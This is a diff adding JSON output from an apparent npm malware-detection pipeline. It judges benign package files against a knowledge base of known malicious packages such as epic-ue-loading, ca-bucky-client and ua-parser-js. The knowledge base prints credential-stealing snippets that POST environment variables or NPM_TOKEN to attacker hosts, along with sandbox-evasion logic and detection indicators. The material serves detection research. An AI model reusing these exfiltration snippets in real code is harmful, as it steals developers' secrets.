+                    "Presence of code that performs outbound HTTPS POST requests to external domains in the package entrypoint"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to *.canarytokens.com domains during npm install or import",
+                    "Unusual DNS lookups or outbound connections to external tracking domains (e.g., canarytokens.com) initiated by npm packages"
+                  ],
+                  "how_to_detect": "Monitor npm package installations and imports for unexpected outbound network activity, especially HTTPS POST requests to canarytokens.com or similar domains. Statistically analyze package entrypoints (such as index.js) for the combined use of os, dns, https, and querystring modules, and for code that collects and transmits environment data. Flag any package that performs network exfiltration of host/user information during install/import, particularly if such behavior is undocumented or unnecessary for the package's stated purpose."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_195356_370783_snippet_1",
+              "source_package": "epic-ue-loading (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_195356_370783/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.43410784006118774,
+              "code_similarity": 0.4737987518310547,
+              "behavior_similarity": 0.3944169580936432,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "var data = process.env || {};\nif (\n  filter.some((entry) =>\n    [].concat(entry).every((item) => (data[item.key] || '').includes(item.val) || item.val === '*')\n  ) ||\n  Object.keys(data).length < 10\n) {\n  return;\n}\nvar req = http.request({\n  host: ['eoxb1lay4m45mms', 'm', ['pip', 'edream'].join(''), 'net'].join('.'),\n  path: '/' + (data.npm_package_name || ''),\n  method: 'POST',\n});\nreq.write(Buffer.from(JSON.stringify(data).toString('base64')));\nreq.end();",
+                "code_behavior": "At import-time or runtime, the code collects all environment variables, checks for sandbox indicators, and if not detected, sends the environment data via HTTP POST to a hardcoded attacker-controlled domain, resulting in exfiltration of sensitive credentials and secrets.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses all environment variables and exfiltrates them to an external, attacker-controlled domain using an HTTP POST request. The use of base64 encoding and obfuscated domain construction, combined with sandbox evasion logic, is characteristic of credential theft and data exfiltration malware.",
+                  "violated_expectations": "Legitimate package code should not access or transmit all environment variables, nor should it communicate with external domains without explicit user consent and clear documentation. Exfiltrating sensitive data to an untrusted domain is a direct violation of user trust and security best practices.",
+                  "similar_legitimate_use": "Some legitimate telemetry or crash reporting tools may send limited, non-sensitive environment data to trusted domains, but they never transmit full environment dumps or send data to untrusted or obfuscated domains.",
+                  "key_indicators": [
+                    "Access to process.env (all environment variables)",
+                    "HTTP POST request to a hardcoded, attacker-controlled domain",
+                    "Base64 encoding of environment data prior to transmission",
+                    "Obfuscated domain construction using array joins",
+                    "Conditional execution based on sandbox detection"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time/runtime",
+                  "file_location": "build.js (in malicious versions, e.g., epic-ue-loading/1.803.0/build.js)",
+                  "required_permissions": [
+                    "environment_vars",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "epic-ue-loading",
+                  "package_manager": "npm",
+                  "package_versions": "1.803.0, 2.802.0, 3.801.0, 4.800.0, 5.799.0, 6.798.0, 7.797.0, 8.796.0, 9.795.0 (malicious); 0.1.0 (benign)",
+                  "why_malicious": "Multiple versions of the package contain code that collects all environment variables from the victim machine and exfiltrates them to an attacker-controlled webhook using HTTP POST requests. The code employs sandbox and analysis environment detection to evade automated security scanners. The latest version (0.1.0) is benign, likely to avoid detection by scanners that only analyze the most recent release."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed as a dependency due to dependency confusion and unpinned versioning.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution on victim machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "On import or runtime, code checks for sandbox or analysis environment using environment variable filters.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "If not a sandbox, proceed to exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "If not in a sandbox, code collects all environment variables and sends them to an attacker-controlled webhook via HTTP POST.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive environment data (secrets, tokens, credentials)"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to all environment variables (process.env) at import-time or runtime",
+                    "HTTP POST requests to hardcoded external domains, especially pipedream.net subdomains",
+                    "Base64 encoding of environment data prior to exfiltration",
+                    "Presence of large environment variable filter lists for sandbox or analysis environment detection",
+                    "Obfuscated domain and filter construction using array joins"
+                  ],
+                  "file_indicators": [
+                    "build.js containing process.env access and HTTP request logic",
+                    "Obfuscated or double-obfuscated JavaScript files in non-latest versions",
+                    "Multiple package versions with high minor/patch numbers and a benign latest version",
+                    "Presence of large filter arrays in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "Connections to *.m.pipedream.net domains (e.g., eoxb1lay4m45mms.m.pipedream.net)",
+                    "Outbound HTTP POST requests during package installation or import"
+                  ],
+                  "how_to_detect": "Monitor for packages that access and exfiltrate environment variables, especially those making HTTP POST requests to known malicious domains such as pipedream.net subdomains. Flag packages containing large environment variable filter lists or obfuscated code in build.js or similar files. Pay special attention to packages with multiple high-numbered versions and a benign latest version, as this is a common evasion technique. Use both static and dynamic analysis to inspect all package versions, not just the latest, and correlate network activity with package installation or import events."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/bz/0.4.5/package/src/bz.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/bz/0.4.5/package/src/xhr.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "xhr_slice_1",
+          "code_snippet": "export var XMLHttpRequest = null;\n\nif (typeof window === 'undefined') {\n  // we're not in a browser?\n  let _loader = require;\n  try {\n    XMLHttpRequest = _loader('sdk/net/xhr').XMLHttpRequest;\n  } catch(e) {\n    XMLHttpRequest = _loader(\"xmlhttprequest\").XMLHttpRequest;\n  }\n}\nelse if(typeof window !== 'undefined' && typeof window.XMLHttpRequest !== 'undefined') {\n  XMLHttpRequest = window.XMLHttpRequest;\n}\nelse {\n  throw \"No window, WAT.\"\n}\n",
+          "is_malicious": false,
+          "malice_score": 0.5716207424799601,
+          "confidence": 0.1,
+          "behavior_summary": "At import-time, the code conditionally accesses and assigns the XMLHttpRequest API by requiring different modules depending on the execution environment (Node.js or browser). It attempts to load network communication capabilities via 'sdk/net/xhr' or 'xmlhttprequest' modules in non-browser contexts, or uses the native window.XMLHttpRequest in browsers, enabling network request functionality. No suspicious hardcoded IPs, URLs, commands, or environment variables are accessed or used, and no direct network, file, or process operations occur in this code.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code conditionally assigns XMLHttpRequest based on the runtime environment, using either native browser APIs or well-known Node.js modules ('sdk/net/xhr' or 'xmlhttprequest'). Unlike the known malicious patterns, it does not redirect require calls to local files, does not contain obfuscated code, does not access sensitive environment variables, nor does it perform any network communication or data exfiltration within this snippet. The behavior is consistent with legitimate cross-environment compatibility code to enable network requests. The similarity to malicious patterns is low and superficial, mainly because of the use of XMLHttpRequest and require statements, but lacks any indicators of malicious intent or payload delivery.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_104013_892794_snippet_2",
+              "source_package": "ca-bucky-client (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_892794/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.6828252077102661,
+              "code_similarity": 0.756449282169342,
+              "behavior_similarity": 0.6092011332511902,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "XMLHttpRequest = require(\"./xmlhttprequest\").XMLHttpRequest;",
+                "code_behavior": "During installation, the code in bucky.js requires a local xmlhttprequest.js file instead of the legitimate npm package, loading the actual malicious payload for execution.",
+                "malice_analysis": {
+                  "why_suspicious": "Redirecting a require statement to a local file with the same name as a popular package is a known obfuscation and privilege escalation technique, often used to hide malicious code.",
+                  "violated_expectations": "Legitimate code would require the official xmlhttprequest package from npm, not a local file with the same name.",
+                  "similar_legitimate_use": "Local shims may be used for testing in development environments, but not in published production packages.",
+                  "key_indicators": [
+                    "require statement points to local xmlhttprequest.js",
+                    "Deviation from expected dependency usage"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall (via bucky.js)",
+                  "file_location": "bucky.js",
+                  "required_permissions": [
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "ca-bucky-client",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.2 and later (0.0.1 is not malicious)",
+                  "why_malicious": "The package is malicious because, during installation, it executes obfuscated JavaScript code that harvests all environment variables and system information, performs anti-analysis checks to evade detection, encodes the stolen data using a custom base64 variant, and exfiltrates it to a remote server controlled by the attacker. This behavior can result in the theft of sensitive credentials, such as AWS keys, and is designed to bypass both automated and manual analysis."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Preinstall script executes bucky.js, which loads the malicious xmlhttprequest.js.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malicious code execution in xmlhttprequest.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "xmlhttprequest.js collects all environment variables from the host system.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "System and credential data harvested"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Performs anti-analysis checks to avoid sandboxes, certain usernames, and specific NPM registries.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Conditional execution or early exit"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Encodes the collected data using a custom base64 function to evade detection.",
+                    "implemented_by": [
+                      "snippet_6"
+                    ],
+                    "leads_to": "Obfuscated data ready for exfiltration"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Dynamically constructs the HTTP request method name to further obfuscate network activity.",
+                    "implemented_by": [
+                      "snippet_7"
+                    ],
+                    "leads_to": "Network exfiltration step"
+                  },
+                  {
+                    "step": 6,
+                    "action": "Sends the obfuscated environment data to a remote server controlled by the attacker.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Exfiltration of sensitive data (final goal)"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Preinstall script execution of local JavaScript files during npm install",
+                    "Bulk access to process.env during installation",
+                    "Outbound network requests to external servers during install phase",
+                    "Obfuscated or dynamically constructed method names in network code",
+                    "Anti-analysis checks for usernames, registry mirrors, or analysis environments"
+                  ],
+                  "file_indicators": [
+                    "Presence of xmlhttprequest.js in package root directory",
+                    "package.json with preinstall script referencing bucky.js",
+                    "require statements for local xmlhttprequest.js in bucky.js"
+                  ],
+                  "network_indicators": [
+                    "Requests to *.wixsite.com/*/_functions/*",
+                    "Outbound HTTP(S) requests initiated during npm install",
+                    "Encoded (base64 with inserted string) payloads in HTTP request bodies"
+                  ],
+                  "how_to_detect": "Monitor npm packages for preinstall scripts that execute local files, especially those that access process.env or initiate outbound network requests. Flag packages containing xmlhttprequest.js not present in the legitimate upstream. Detect obfuscated code that dynamically constructs method names or encodes data with non-standard base64 (e.g., with inserted strings). Alert on network traffic to known exfiltration endpoints such as wixsite.com/_functions/ during package installation."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_214414_450355_snippet_2",
+              "source_package": "mplatlib, markedjs, lemaaa, mrg-message-broker, ua-parser-js (PyPI, npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_214414_450355/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.533319354057312,
+              "code_similarity": 0.4445657432079315,
+              "behavior_similarity": 0.6220729351043701,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "function _0x1b96c9(...) { ... eval(...); req['on'](...); req['write'](data); ... } // Obfuscated, long single line",
+                "code_behavior": "At import-time, the code executes an obfuscated JavaScript function that collects data and sends it to an external server via HTTP POST, resulting in exfiltration of sensitive information.",
+                "malice_analysis": {
+                  "why_suspicious": "The only difference from the legitimate package is a single, obfuscated line, which is a common tactic for hiding malicious payloads and evading detection.",
+                  "violated_expectations": "Legitimate packages should not contain obfuscated, undocumented code, especially as the only change from a trusted upstream.",
+                  "similar_legitimate_use": "Obfuscation is sometimes used in commercial JavaScript, but not in open-source clones or as a single-line addition in a forked package.",
+                  "key_indicators": [
+                    "Obfuscated single-line addition in main.js",
+                    "Network exfiltration via HTTP POST",
+                    "Masquerading as a popular package"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "markedjs/main.js (single line difference from legitimate package)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "mplatlib, markedjs, lemaaa, mrg-message-broker, ua-parser-js",
+                  "package_manager": "PyPI, npm",
+                  "package_versions": "mplatlib: 0.2; markedjs: 3.0.4; lemaaa: (unspecified); mrg-message-broker: 9998.987.376; ua-parser-js: 0.7.29, 0.8.0, 1.0.0",
+                  "why_malicious": "These packages are considered malicious because they use supply chain attack techniques such as typosquatting, masquerading, trojan functionality, dependency confusion, and account hijacking to deliver obfuscated or hidden payloads. These payloads exfiltrate sensitive data (such as credentials and environment variables), steal tokens, or compromise systems. The malicious code is often obfuscated, hidden among legitimate code, or injected into trusted packages, making detection difficult and increasing the risk to the software supply chain."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker publishes a malicious package using typosquatting, masquerading, trojan, dependency confusion, or hijacking methods.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious package is installed by unsuspecting user or CI/CD system."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes at install-time or import-time, often obfuscated to evade detection.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Sensitive data is accessed or exfiltrated."
+                  },
+                  {
+                    "step": 3,
+                    "action": "At runtime, utility functions or hooks may further exfiltrate credentials or secrets.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker gains access to user accounts or secrets."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Exfiltrated data is sent to attacker-controlled infrastructure.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Attacker achieves final goal: credential theft, system compromise, or disruption."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Obfuscated code in package entrypoints or main files (e.g., __init__.py, main.js, index.js)",
+                    "Network requests to hardcoded or suspicious domains during install/import (e.g., http://malicious-site.com, http://attacker.com/steal)",
+                    "Access to environment variables or credential files during install/import",
+                    "Single-line or minimal changes in otherwise legitimate codebases (diff against upstream)",
+                    "Unusually high version numbers in public repositories (indicative of dependency confusion)"
+                  ],
+                  "file_indicators": [
+                    "Obfuscated or minified code in __init__.py, index.js, or main.js",
+                    "Unexpected network libraries (requests, http, etc.) in setup.py, __init__.py, or main JavaScript files",
+                    "High version numbers not matching internal repositories or upstream"
+                  ],
+                  "network_indicators": [
+                    "HTTP/HTTPS POST requests to unknown or attacker-controlled domains (e.g., http://malicious-site.com, http://attacker.com/steal)",
+                    "Domains not associated with the legitimate package or project"
+                  ],
+                  "how_to_detect": "Monitor for obfuscated or minified code in package entrypoints and main files, and flag unexpected network activity during install/import, especially HTTP POST requests to untrusted domains. Use automated diffing tools to compare new package versions with trusted upstreams and detect single-line or minimal changes. Flag packages with names similar to popular libraries (typosquatting/masquerading) and those with sudden, unexplained changes or obfuscated payloads. Monitor outbound network traffic from build and CI/CD environments for connections to untrusted domains, and alert on access to environment variables or credential files during installation or import."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_113914_371541_snippet_2",
+              "source_package": "ua-parser-js (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20250102_113914_371541/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5050442218780518,
+              "code_similarity": 0.39456552267074585,
+              "behavior_similarity": 0.6155229806900024,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Actual code pattern from the malicious ua-parser-js versions:\nconst https = require('https');\nconst token = process.env['NPM_TOKEN'];\nif (token) {\n  const req = https.request({hostname: 'malicious-domain.com', method: 'POST'}, res => {});\n  req.write(token);\n  req.end();\n}",
+                "code_behavior": "At import-time, the code accesses the NPM_TOKEN environment variable and sends its value to a hardcoded malicious domain via HTTPS POST, enabling credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "Accessing sensitive environment variables and exfiltrating their values to an external server is a clear sign of credential theft and malicious intent.",
+                  "violated_expectations": "Legitimate packages should not access or transmit sensitive environment variables to third parties. Such behavior is outside the scope of normal package functionality.",
+                  "similar_legitimate_use": "Some CI/CD tools or deployment scripts may access environment variables for internal use, but never to send them to untrusted domains or external servers.",
+                  "key_indicators": [
+                    "Access to process.env for sensitive variables (e.g., NPM_TOKEN)",
+                    "Network exfiltration to hardcoded, untrusted domain",
+                    "Automatic execution on import without user interaction",
+                    "No legitimate reason for external transmission of credentials"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "main entry point (e.g., index.js) or a required module loaded on import",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "ua-parser-js",
+                  "package_manager": "npm",
+                  "package_versions": "0.7.29, 0.8.0, 1.0.0 (three malicious versions released in October 2021)",
+                  "why_malicious": "Attackers compromised the maintainer's npm account and published three malicious versions of the ua-parser-js package. These versions contained code that executed remote payloads during installation and exfiltrated sensitive environment variables at runtime, enabling attackers to steal credentials and potentially take control of affected systems."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious code is executed during package installation via a postinstall script, which downloads and runs a remote payload from an attacker-controlled server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "System compromise, remote code execution, and installation of additional malware"
+                  },
+                  {
+                    "step": 2,
+                    "action": "At import-time, the malicious code accesses sensitive environment variables (such as NPM_TOKEN) and exfiltrates them to an attacker-controlled server.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Credential theft, unauthorized access to private repositories, and potential lateral movement"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of postinstall scripts that invoke shell commands to download and execute remote code",
+                    "Access to sensitive environment variables (e.g., NPM_TOKEN) followed by network requests to untrusted domains",
+                    "Unexpected outbound network activity during package installation or import-time"
+                  ],
+                  "file_indicators": [
+                    "package.json containing postinstall scripts referencing external URLs or invoking shell commands",
+                    "JavaScript files that use child_process.exec() or similar to run curl/wget piped to sh",
+                    "Source files accessing process.env for sensitive variables and sending data over the network"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS requests to domains not associated with ua-parser-js or its legitimate infrastructure",
+                    "Connections to hardcoded or known malicious domains during or immediately after installation/import"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that execute shell commands or download remote resources. Flag packages that access sensitive environment variables and transmit their values to external domains. Use network monitoring to detect unexpected outbound connections to untrusted domains during package installation or import. Review package.json and source files for suspicious scripts, use of child_process, or hardcoded domains."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_202035_951167_snippet_3",
+              "source_package": "@jackshanyeshuzi/curvess (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202035_951167/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5045700669288635,
+              "code_similarity": 0.3825090825557709,
+              "behavior_similarity": 0.6266310214996338,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "const http = require('http');",
+                "code_behavior": "At module import, the code imports the http library, which is not required for legitimate cryptographic operations, enabling later network exfiltration of sensitive data.",
+                "malice_analysis": {
+                  "why_suspicious": "Importing the http module in a cryptographic math file is highly unusual and unnecessary unless for malicious network activity. This import is a preparatory step for exfiltrating sensitive data.",
+                  "violated_expectations": "Legitimate cryptographic math files should not require or import network libraries, as all operations should be performed locally without network communication.",
+                  "similar_legitimate_use": "There is no legitimate use for network libraries in elliptic curve math or cryptographic computation files.",
+                  "key_indicators": [
+                    "Unexpected import of http module in cryptographic code",
+                    "No legitimate use of network code in cryptographic math files",
+                    "Presence of network library import at the top of a math-focused file"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "module import (library initialization)",
+                  "file_location": "abstract/weierstrass.js (top of file)",
+                  "required_permissions": []
+                },
+                "package_info": {
+                  "package_name": "@jackshanyeshuzi/curvess",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.0 - 1.1.9 (all published versions as of 2023-08-04)",
+                  "why_malicious": "The package is a typosquat of the legitimate @noble/curves cryptographic library and contains concealed code that exfiltrates users' private cryptographic keys to an attacker-controlled server. This results in a total compromise of cryptographic operations and user key material, posing a severe security risk."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs ethereum-cryptographyyy, which depends on @jackshanyeshuzi/curvess instead of the legitimate @noble/curves.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code in @jackshanyeshuzi/curvess is loaded."
+                  },
+                  {
+                    "step": 2,
+                    "action": "When cryptographic signing is performed, the prepSig function in @jackshanyeshuzi/curvess is invoked.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Private key is captured and prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "prepSig function sends the user's private key to wallet.cba123.cn via HTTP/HTTPS request.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives the user's private key, compromising all cryptographic security."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Network requests (HTTP/HTTPS) to external domains during cryptographic operations",
+                    "Logging or exporting of private key material in cryptographic functions",
+                    "Obfuscated string construction for network requests in cryptographic libraries",
+                    "Unexpected network activity triggered by cryptographic math functions"
+                  ],
+                  "file_indicators": [
+                    "abstract/weierstrass.js containing http or https module imports",
+                    "prepSig function with network request code",
+                    "References to wallet.cba123.cn or similar domains in code",
+                    "Obfuscated string arrays used to construct URLs in cryptographic files"
+                  ],
+                  "network_indicators": [
+                    "Connections to wallet.cba123.cn",
+                    "Connections to 42.96.168.4 (ALISOFT, CN)",
+                    "Unusual HTTP/HTTPS requests during cryptographic operations",
+                    "Outbound requests to hardcoded domains from cryptographic libraries"
+                  ],
+                  "how_to_detect": "Monitor cryptographic libraries for unexpected network activity, especially HTTP/HTTPS requests to external domains such as wallet.cba123.cn or 42.96.168.4. Scan for code that logs or exports private key material, and flag any obfuscated string construction used in network requests. Audit dependencies for typosquatted packages and verify that cryptographic math files do not import network libraries. Use static analysis to detect hardcoded domains and dynamic analysis to observe network behavior during cryptographic operations."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104209_078389_snippet_1",
+              "source_package": "cdn.polyfill.io (web-cdn)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_104209_078389/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5026348829269409,
+              "code_similarity": 0.44125181436538696,
+              "behavior_similarity": 0.5640180110931396,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "<script src=\"https://cdn.polyfill.io\"></script>",
+                "code_behavior": "At import-time, the browser loads and executes JavaScript from cdn.polyfill.io, which initiates network requests to attacker-controlled or typosquatted domains, resulting in user redirection or additional malicious payload delivery.",
+                "malice_analysis": {
+                  "why_suspicious": "The CDN, previously trusted, now serves scripts that perform unauthorized actions such as redirecting users and loading code from lookalike domains, which is a significant deviation from its original purpose.",
+                  "violated_expectations": "A CDN-hosted polyfill script should only provide browser compatibility code and must not perform redirects, inject additional scripts, or communicate with suspicious domains.",
+                  "similar_legitimate_use": "Legitimate CDNs serve static polyfill or analytics scripts without redirecting users or referencing non-official domains.",
+                  "key_indicators": [
+                    "Script loaded from cdn.polyfill.io performs unexpected redirects",
+                    "References to typosquatted or attacker-controlled domains in loaded scripts",
+                    "Behavioral change after domain ownership transfer"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time (when <script src=\"cdn.polyfill.io\"> is loaded by the browser)",
+                  "file_location": "Injected via remote script from cdn.polyfill.io, included in the HTML of victim websites",
+                  "required_permissions": [
+                    "network",
+                    "DOM access",
+                    "browser execution context"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "cdn.polyfill.io",
+                  "package_manager": "web-cdn",
+                  "package_versions": "all versions after February 2024 (post-acquisition by Funnull)",
+                  "why_malicious": "After the domain cdn.polyfill.io was acquired by Funnull in February 2024, the CDN began serving modified JavaScript that injects malicious code into any website embedding it. This code redirects users to spam or malicious sites, loads additional payloads from attacker-controlled or typosquatted domains, and leverages anti-analysis techniques to evade detection. The attack abuses the trust in a previously reputable CDN to compromise a large number of websites."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Website includes <script src=\"cdn.polyfill.io\">, loading remote JavaScript.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Malicious script is executed in the user's browser."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious script from cdn.polyfill.io fetches and executes additional code from typosquatted domains (e.g., googie-analytics.com).",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "User may be redirected or further payloads may be executed."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious script checks if the user is an admin and avoids execution if detected, to evade analysis.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious actions are only performed on non-admin users, reducing detection risk."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unexpected redirects or script loads from websites using cdn.polyfill.io",
+                    "Loading of JavaScript from typosquatted domains such as googie-analytics.com",
+                    "Conditional execution logic in scripts to evade admin or analysis environments"
+                  ],
+                  "file_indicators": [
+                    "<script src=\"cdn.polyfill.io\">",
+                    "References to googie-analytics.com or other lookalike domains in loaded scripts"
+                  ],
+                  "network_indicators": [
+                    "Requests to cdn.polyfill.io",
+                    "Requests to googie-analytics.com",
+                    "Requests to other suspicious or typosquatted domains (e.g., kuurza.com)"
+                  ],
+                  "how_to_detect": "Scan website source code and network traffic for inclusion of cdn.polyfill.io and references to typosquatted domains. Monitor for unexpected redirects or script loads, especially from domains that closely resemble legitimate services (e.g., Google Analytics). Use web application firewalls or browser security tools to block or alert on requests to known malicious or typosquatted domains. Implement automated scanning for conditional execution logic that attempts to evade admin or analysis environments."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
